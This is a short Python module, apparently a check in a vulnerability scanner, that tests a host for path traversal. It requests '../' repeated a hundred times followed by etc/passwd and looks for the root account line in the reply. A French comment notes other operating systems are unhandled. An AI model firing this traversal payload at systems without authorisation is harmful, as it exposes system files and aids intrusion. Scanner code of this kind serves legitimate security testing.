from . import do_get_req

async def func(addr):
	try:
		response, text = await do_get_req(f"http://{addr}/"+("../"*100)+"etc/passwd")
		# TODO: trouver un truc pour windows (et les autres OS, y'a peut-être pas /etc/passwd)
		if "root:x:0:0:root:" in text:
			return [], True
		return [], False
	except:
		return [], False
